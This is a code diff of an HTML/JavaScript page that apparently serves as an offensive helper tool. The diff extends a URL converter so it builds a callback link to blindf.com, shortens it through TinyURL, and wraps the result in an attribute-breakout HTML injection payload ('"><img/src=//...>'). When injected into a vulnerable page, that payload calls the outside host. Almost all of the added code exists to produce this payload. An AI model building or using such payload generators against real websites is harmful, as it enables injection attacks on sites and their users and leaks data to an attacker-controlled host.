@@ -2,13 +2,13 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>URL Modifier</title>
+  <title>URL Modifier & Shortener</title>
   <style>
     body {
       font-family: Arial, sans-serif;
       padding: 20px;
     }
-    input[type="text"], #output {
+    input[type="text"], #output, #shortenedOutput, #payloadOutput {
       width: 100%;
       padding: 10px;
       margin-top: 10px;
@@ -22,14 +22,22 @@
     }
   </style>
 </head>
-<body>
-  <h2>URL to Blindf Format Converter</h2>
+<body>dd
+  <h2>URL to Blindf Format Converter + TinyURL Payload</h2>
+
   <label for="urlInput">Enter URL:</label>
-  <input type="text" id="urlInput" placeholder="https://www.xyz.com/lakdjf/aldfj/?lasd=hi&ad=hy">
+  <input type="text" id="urlInput" placeholder="https://www.xyz.com/page?test=value">
+
   <button onclick="convertURL()">Convert</button>
-  
+
   <h3>Modified URL:</h3>
   <input type="text" id="output" readonly>
+
+  <h3>Shortened URL:</h3>
+  <input type="text" id="shortenedOutput" readonly>
+
+  <h3>Final Payload:</h3>
+  <input type="text" id="payloadOutput" readonly>
 
   <script>
     function convertURL() {
@@ -40,8 +48,25 @@
         .replace(/^https?:\/\//, '')  // remove protocol
         .replace(/[\/=?&]/g, '_');    // replace / ? = & with _
 
-      const finalURL = `//blindf.com/b.php?c=${modified}`;
+      const finalURL = `https://blindf.com/b.php?c=${modified}`;
       document.getElementById("output").value = finalURL;
+
+      // Use TinyURL to shorten it
+      fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(finalURL)}`)
+        .then(response => response.text())
+        .then(shortUrl => {
+          document.getElementById("shortenedOutput").value = shortUrl;
+
+          // Remove protocol for payload
+          const withoutProtocol = shortUrl.replace(/^https?:\/\//, '');
+          const payload = `"><img/src=//${withoutProtocol}>`;
+          document.getElementById("payloadOutput").value = payload;
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          document.getElementById("shortenedOutput").value = 'Error shortening URL.';
+          document.getElementById("payloadOutput").value = '';
+        });
     }
   </script>
 </body>
